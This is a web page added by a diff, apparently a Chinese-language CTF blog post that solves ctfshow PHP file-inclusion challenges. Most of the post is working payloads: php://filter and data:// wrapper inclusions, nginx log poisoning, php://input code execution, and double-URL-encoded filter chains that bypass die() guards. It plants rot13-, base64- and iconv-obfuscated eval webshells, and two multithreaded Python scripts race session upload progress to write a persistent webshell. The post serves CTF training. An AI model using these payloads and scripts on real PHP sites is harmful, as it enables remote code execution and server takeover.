@@ -1,0 +1,814 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/biaotou.png">
+  <link rel="icon" href="/img/biaotou.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="orange">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="前言:炒冷饭也不失一种乐趣。 web781?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;flag.php  web791?file&#x3D;data:&#x2F;&#x2F;text&#x2F;plain;base64,PD9waHAgCnN5c3RlbSgidGFjIGZsYWcucGhwIikKPz4&#x3D;  原理就是将&#96;进行base64写进去执行 web800x011?f">
+<meta property="og:type" content="article">
+<meta property="og:title" content="ctfshow文件包含">
+<meta property="og:url" content="http://example.com/2024/09/13/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/ctfshow%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/index.html">
+<meta property="og:site_name" content="0raN9e的笔记">
+<meta property="og:description" content="前言:炒冷饭也不失一种乐趣。 web781?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;flag.php  web791?file&#x3D;data:&#x2F;&#x2F;text&#x2F;plain;base64,PD9waHAgCnN5c3RlbSgidGFjIGZsYWcucGhwIikKPz4&#x3D;  原理就是将&#96;进行base64写进去执行 web800x011?f">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2024-09-13T14:00:00.000Z">
+<meta property="article:modified_time" content="2024-09-13T14:51:28.634Z">
+<meta property="article:author" content="orange">
+<meta property="article:tag" content="文件包含">
+<meta name="twitter:card" content="summary_large_image">
+  
+  
+    <meta name="referrer" content="no-referrer-when-downgrade">
+  
+  
+  <title>ctfshow文件包含 - 0raN9e的笔记</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.7","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":"y20YQnBmfM0DqawGjwxeWhCq-gzGzoHsz","app_key":"Y55Ca02EpnhoEzDEjf7sqVwX","server_url":null,"path":"window.location.pathname","ignore_local":true}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+  
+
+  
+    <!-- Google tag (gtag.js) -->
+    <script async>
+      if (!Fluid.ctx.dnt) {
+        Fluid.utils.createScript("https://www.googletagmanager.com/gtag/js?id=", function() {
+          window.dataLayer = window.dataLayer || [];
+          function gtag() {
+            dataLayer.push(arguments);
+          }
+          gtag('js', new Date());
+          gtag('config', '');
+        });
+      }
+    </script>
+  
+
+  
+
+  
+
+  
+
+  
+    
+  
+
+
+
+  
+<meta name="generator" content="Hexo 7.1.1"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>橙子</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/" target="_self">
+                <i class="iconfont icon-link-fill"></i>
+                <span>友链</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/images/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/background.jpg') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="ctfshow文件包含"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2024-09-13 22:00" pubdate>
+          2024年9月13日 晚上
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          1.6k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          14 分钟
+        
+      </span>
+    
+
+    
+    
+      
+        <span id="busuanzi_container_page_pv" style="display: none">
+          <i class="iconfont icon-eye" aria-hidden="true"></i>
+          <span id="busuanzi_value_page_pv"></span> 次
+        </span>
+        
+      
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">ctfshow文件包含</h1>
+            
+              <p id="updated-time" class="note note-info" style="">
+                
+                  
+                    本文最后更新于 2024年9月13日 晚上
+                  
+                
+              </p>
+            
+            
+              <div class="markdown-body">
+                
+                <p>前言:炒冷饭也不失一种乐趣。</p>
+<h2 id="web78"><a href="#web78" class="headerlink" title="web78"></a>web78</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?file=php://filter/convert.base64-encode/resource=flag.php<br></code></pre></td></tr></table></figure>
+
+<h2 id="web79"><a href="#web79" class="headerlink" title="web79"></a>web79</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?file=data://text/plain;<span class="hljs-built_in">base64</span>,PD9waHAgCnN5c3RlbSgidGFjIGZsYWcucGhwIikKPz4=<br></code></pre></td></tr></table></figure>
+
+<p>原理就是将<?php system("tac flag.php") ?>&#96;进行base64写进去执行</p>
+<h2 id="web80"><a href="#web80" class="headerlink" title="web80"></a>web80</h2><h3 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?file=/var/log/nginx/access.log<br></code></pre></td></tr></table></figure>
+
+<p>容器环境利用nginx，然后写个读写就行,先进行ls然后进行读取</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">&lt;?php system(<span class="hljs-string">&#x27;tac fl0g.php&#x27;</span>);?&gt; <br></code></pre></td></tr></table></figure>
+
+<h3 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?file=pHp://input<br></code></pre></td></tr></table></figure>
+
+<p>然后bp发包post执行就行</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">&lt;?php system(<span class="hljs-string">&#x27;tac fl0g.php&#x27;</span>)?&gt;<br></code></pre></td></tr></table></figure>
+
+<h2 id="web81"><a href="#web81" class="headerlink" title="web81"></a>web81</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?file=/var/log/nginx/access.log<br></code></pre></td></tr></table></figure>
+
+<p>容器环境利用nginx，然后写个读写就行,先进行ls然后进行读取</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">&lt;?php system(<span class="hljs-string">&#x27;tac fl0g.php&#x27;</span>);?&gt; <br></code></pre></td></tr></table></figure>
+
+<h2 id="web82"><a href="#web82" class="headerlink" title="web82"></a>web82</h2><p>以下都是条件竞争本人也写的少</p>
+<p>将所有条件的禁用了，只能使用session了。因为在php中我们能够利用的无后缀的文件就是session，我们可以利用<code>session.upload_progress</code>来进行文件包含，利用<code>PHP_SESSION_UPLOAD_PROGRESS</code>参数</p>
+<p>讲以下原理，在php5.4引入了一些内容在php.ini里面</p>
+<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs markdown">session.upload<span class="hljs-emphasis">_progress.enable = on</span><br><span class="hljs-emphasis">session.upload_</span>progress.cleanup = on<br>session.upload<span class="hljs-emphasis">_progress.prefix = &quot;upload_</span>progress<span class="hljs-emphasis">_&quot;</span><br><span class="hljs-emphasis">session.upload_</span>progress.name = &quot;PHP<span class="hljs-emphasis">_SESSION_</span>UPLOAD<span class="hljs-emphasis">_PROGRESS&quot;</span><br></code></pre></td></tr></table></figure>
+
+<ul>
+<li><code>enable = on</code>表示upload_progress功能开始，也意味着当浏览器向服务器上传一个文件时，php将会把此次文件上传的详细信息(如上传时间、上传进度等)存储在session当中 ；</li>
+<li><code>cleanup = on</code>表示当文件上传结束后，php将会立即清空对应session文件中的内容，这个选项非常重要；</li>
+<li><code>name</code>当它出现在表单中，php将会报告上传进度，最大的好处是，它的值可控；</li>
+<li><code>prefix+name</code>将表示为session中的键名;</li>
+<li>另外还有一个session配置中的重要选项：<code>session.use_strict_mode=off</code>这个选项默认值为off，表示我们对Cookie中sessionid可控。</li>
+</ul>
+<p>进行大概的分析，<code>session.auto_start=on</code>，则php会在接收请求的时候会自动初始化Session，不再需要执行<code>session_start()</code>。但默认情况下，这个选项都是关闭的。但session还有一个默认选项，<code>session.use_strict_mode</code>默认值为0。此时用户是可以自己定义Session ID的。比如在Cookie里设置PHPSESSID&#x3D;orange,PHP将会在服务器里创建一个文件&#x2F;tmp&#x2F;sess_orange。即使没有初始化Session，PHP也会进行初始化，并产生一个键值，这个键值由上面的<code>prefix+name</code>组成，最后被写入sess_文件里面</p>
+<p>这种题目建议用脚本多线程跑，直接上脚本</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> threading<br><span class="hljs-keyword">import</span> io<br><br>url = <span class="hljs-string">&quot;http://fc0d1b76-c5a1-495b-98ba-d7b85e5c7460.challenge.ctf.show/&quot;</span><br>sessID = <span class="hljs-string">&#x27;orange&#x27;</span><br>data = &#123;<br>    <span class="hljs-string">&quot;1&quot;</span>: <span class="hljs-string">&quot;file_put_contents(&#x27;/var/www/html/1.php&#x27;, &#x27;&lt;?php eval($_POST[2]);?&gt;&#x27;);&quot;</span><br>&#125;<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">write</span>(<span class="hljs-params">session</span>):<br>    fileBytes = io.BytesIO(<span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">1024</span> * <span class="hljs-number">50</span>)<br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        res = session.post(url,<br>                           data=&#123;<br>                               <span class="hljs-string">&#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;</span>: <span class="hljs-string">&#x27;&lt;?php eval($_POST[1]);?&gt;&#x27;</span><br>                           &#125;,<br>                           cookies=&#123;<br>                               <span class="hljs-string">&quot;PHPSESSID&quot;</span>: sessID<br>                           &#125;,<br>                           files=&#123;<br>                               <span class="hljs-string">&#x27;file&#x27;</span>: (<span class="hljs-string">&#x27;orange.png&#x27;</span>, fileBytes)<br>                           &#125;<br>                           )<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">read</span>(<span class="hljs-params">session</span>):<br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        res1 = session.post(url + <span class="hljs-string">&#x27;?file=/tmp/sess_&#x27;</span> + sessID, data=data,<br>                            cookies=&#123;<br>                                <span class="hljs-string">&quot;PHPSESSID&quot;</span>: sessID<br>                            &#125;)<br>        res2 = session.get(url + <span class="hljs-string">&#x27;1.php&#x27;</span>)<br>        <span class="hljs-keyword">if</span> res2.status_code == <span class="hljs-number">200</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;-------ok------&quot;</span>)<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-built_in">print</span>(res2.status_code)<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    event = threading.Event()  <span class="hljs-comment"># 开启多线程的对象</span><br>    <span class="hljs-keyword">with</span> requests.session() <span class="hljs-keyword">as</span> session:<br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">5</span>):  <span class="hljs-comment"># 开5个线程</span><br>            threading.Thread(target=write, args=(session,)).start()<br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">5</span>):<br>            threading.Thread(target=read, args=(session,)).start()<br><br>        event.<span class="hljs-built_in">set</span>()  <span class="hljs-comment"># 唤醒线程</span><br></code></pre></td></tr></table></figure>
+
+<h2 id="web83"><a href="#web83" class="headerlink" title="web83"></a>web83</h2><p>和上面一致</p>
+<h2 id="web84"><a href="#web84" class="headerlink" title="web84"></a>web84</h2><p>和上面一致优化了一下代码，用都是一样的</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> threading<br><span class="hljs-keyword">import</span> io<br><br>url = <span class="hljs-string">&quot;http://420c9489-80b6-4a27-a2ba-240311c8ef48.challenge.ctf.show/&quot;</span><br>sessID = <span class="hljs-string">&#x27;orange&#x27;</span><br>data = &#123;<br>    <span class="hljs-string">&quot;1&quot;</span>: <span class="hljs-string">&quot;file_put_contents(&#x27;/var/www/html/1.php&#x27;, &#x27;&lt;?php eval($_POST[2]);?&gt;&#x27;);&quot;</span><br>&#125;<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">write</span>(<span class="hljs-params">session</span>):<br>    file_bytes = io.BytesIO(<span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">1024</span> * <span class="hljs-number">50</span>)<br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        session.post(url,<br>                     data=&#123;<span class="hljs-string">&#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;</span>: <span class="hljs-string">&#x27;&lt;?php eval($_POST[1]);?&gt;&#x27;</span>&#125;,<br>                     cookies=&#123;<span class="hljs-string">&quot;PHPSESSID&quot;</span>: sessID&#125;,<br>                     files=&#123;<span class="hljs-string">&#x27;file&#x27;</span>: (<span class="hljs-string">&#x27;orange.png&#x27;</span>, file_bytes)&#125;)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">read</span>(<span class="hljs-params">session</span>):<br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        session.post(url + <span class="hljs-string">&#x27;?file=/tmp/sess_&#x27;</span> + sessID, data=data, cookies=&#123;<span class="hljs-string">&quot;PHPSESSID&quot;</span>: sessID&#125;)<br>        res = session.get(url + <span class="hljs-string">&#x27;1.php&#x27;</span>)<br>        <span class="hljs-keyword">if</span> res.status_code == <span class="hljs-number">200</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;+++done+++&quot;</span>)<br>            <span class="hljs-keyword">break</span>  <span class="hljs-comment"># 假设成功后停止读取线程</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">start_threads</span>(<span class="hljs-params">target, session, count=<span class="hljs-number">5</span></span>):<br>    <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(count):<br>        threading.Thread(target=target, args=(session,), daemon=<span class="hljs-literal">True</span>).start()<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    <span class="hljs-keyword">with</span> requests.Session() <span class="hljs-keyword">as</span> session:<br>        start_threads(write, session)<br>        start_threads(read, session)<br><br>    threading.Event().wait()  <span class="hljs-comment"># 保持主线程运行</span><br><br></code></pre></td></tr></table></figure>
+
+<p>由于是多线程，及时执行system也删不完，所以基本没什么用，之前的代码就行了</p>
+<h2 id="web85"><a href="#web85" class="headerlink" title="web85"></a>web85</h2><p>和上面一致</p>
+<h2 id="web86"><a href="#web86" class="headerlink" title="web86"></a>web86</h2><p>和上面一致</p>
+<h2 id="web87"><a href="#web87" class="headerlink" title="web87"></a>web87</h2><p>这题加入了post并且加入了死亡绕过，不是条件竞争了</p>
+<h3 id="0x01-1"><a href="#0x01-1" class="headerlink" title="0x01"></a>0x01</h3><p>rot13进行绕过</p>
+<p>用<code>php://filter/write=string.rot13/resource=orange.php</code>进行写入，需要双url进行绕过</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?file=%25%37%30%25%36%38%25%37%30%25%33%61%25%32%66%25%32%66%25%36%36%25%36%39%25%36%63%25%37%34%25%36%35%25%37%32%25%32%66%25%37%37%25%37%32%25%36%39%25%37%34%25%36%35%25%33%64%25%37%33%25%37%34%25%37%32%25%36%39%25%36%65%25%36%37%25%32%65%25%37%32%25%36%66%25%37%34%25%33%31%25%33%33%25%32%66%25%37%32%25%36%35%25%37%33%25%36%66%25%37%35%25%37%32%25%36%33%25%36%35%25%33%64%25%36%66%25%37%32%25%36%31%25%36%65%25%36%37%25%36%35%25%32%65%25%37%30%25%36%38%25%37%30<br></code></pre></td></tr></table></figure>
+
+<p>content写入简单的一句话木马然后rot13编码一下</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">content=&lt;?cuc @riny(<span class="hljs-variable">$_TRG</span>[<span class="hljs-string">&#x27;pzq&#x27;</span>]);?&gt;<br></code></pre></td></tr></table></figure>
+
+<p>进入&#x2F;orange.php 执行<code>?cmd=system(&#39;tac f*&#39;);</code></p>
+<h3 id="0x02-1"><a href="#0x02-1" class="headerlink" title="0x02"></a>0x02</h3><p>base64进行绕过</p>
+<p>方法基本一致，用<code>php://filter/write=convert.base64-decode/resource=apple.php</code>进行双url</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?file=%25%37%30%25%36%38%25%37%30%25%33%61%25%32%66%25%32%66%25%36%36%25%36%39%25%36%63%25%37%34%25%36%35%25%37%32%25%32%66%25%37%37%25%37%32%25%36%39%25%37%34%25%36%35%25%33%64%25%36%33%25%36%66%25%36%65%25%37%36%25%36%35%25%37%32%25%37%34%25%32%65%25%36%32%25%36%31%25%37%33%25%36%35%25%33%36%25%33%34%25%32%64%25%36%34%25%36%35%25%36%33%25%36%66%25%36%34%25%36%35%25%32%66%25%37%32%25%36%35%25%37%33%25%36%66%25%37%35%25%37%32%25%36%33%25%36%35%25%33%64%25%36%31%25%37%30%25%37%30%25%36%63%25%36%35%25%32%65%25%37%30%25%36%38%25%37%30<br></code></pre></td></tr></table></figure>
+
+<p>然后给一句话木马写入</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">content=11PD9waHAgQGV2YWwoJF9HRVRbJ2NtZCddKTs/Pg==<br></code></pre></td></tr></table></figure>
+
+<p>前面多加两个字符，为了使前面的结合成功进行base64，剩下的都是一样的了</p>
+<h2 id="web88"><a href="#web88" class="headerlink" title="web88"></a>web88</h2><p>跟web79基本一致，需要微调一下代码</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?file=data://text/plain;<span class="hljs-built_in">base64</span>,PD9waHAgZXZhbCgkX0dFVFsnY21kJ10pO3dob2FtaSgpPz4x&amp;cmd=system(<span class="hljs-string">&#x27;tac fl0g.php&#x27;</span>);<br></code></pre></td></tr></table></figure>
+
+<p>中间的内容我写的是<code>&lt;?php eval($_GET[&#39;cmd&#39;]);whoami()?&gt;1</code></p>
+<h2 id="web116"><a href="#web116" class="headerlink" title="web116"></a>web116</h2><p>这个我不想下载视频，直接看答案<code>?file=flag.php</code></p>
+<h2 id="web117"><a href="#web117" class="headerlink" title="web117"></a>web117</h2><p>这题其实还是用伪协议进行绕过，只是禁用了常见的rot13和base64而已，换一个就行了</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">?file=php://filter/write=convert.iconv.UCS-2LE.UCS-2BE/resource=orange.php<br>contents=?&lt;hp pe@av(l_<span class="hljs-variable">$OPTSj</span>[]z;)&gt;?<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">&lt;?php<br>highlight_file(__FILE__);<br>file_put_contents(<span class="hljs-string">&quot;php://filter/convert.iconv.ucs-2be.ucs-2le/resource=5.php&quot;</span><br>, <span class="hljs-string">&quot;&lt;?php die();?&gt;?&lt;hp pvela<span class="hljs-subst">$(G_TE&#x27;[&#x27;a)</span>] ;&gt;?&quot;</span>); <br>?&gt;<br></code></pre></td></tr></table></figure>
+
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/" class="category-chain-item">每日一题</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" class="print-no-link">#文件包含</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>ctfshow文件包含</div>
+      <div>http://example.com/2024/09/13/每日一题/ctfshow文件包含/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>orange</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2024年9月13日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2024/09/11/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/ctfshow%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" title="ctfshow命令执行">
+                        <span class="hidden-mobile">ctfshow命令执行</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
